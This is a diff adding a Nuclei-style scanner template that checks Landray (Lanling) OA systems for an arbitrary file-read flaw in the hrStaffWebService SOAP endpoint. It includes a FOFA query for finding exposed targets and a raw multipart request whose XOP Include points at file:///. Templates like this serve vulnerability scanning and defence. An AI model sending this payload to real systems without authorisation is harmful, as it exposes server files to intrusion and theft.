@@ -1,0 +1,42 @@
+id: lanling-oa-hrstaffwebservice-fileread
+
+info:
+  name: lanling-oa-hrstaffwebservice-fileread
+  author: PokerSec
+  severity: high
+  metadata:
+    fofasearch:  body="Com_Parameter"
+
+variables:
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /sys/webservice/hrStaffWebService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/related; boundary=----{{boundary}}
+        SOAPAction: ""
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.staff.hr.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getHrStaffElements>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include 
+        xmlns:xop="http://www.w3.org/2004/08/xop/include" 
+        href="file:///"/></count>
+                </arg0>
+            </web:getHrStaffElements>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------{{boundary}}--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==500 && contains_all(body,"<faultstring>") && contains_all(body,"Unmarshalling Error")
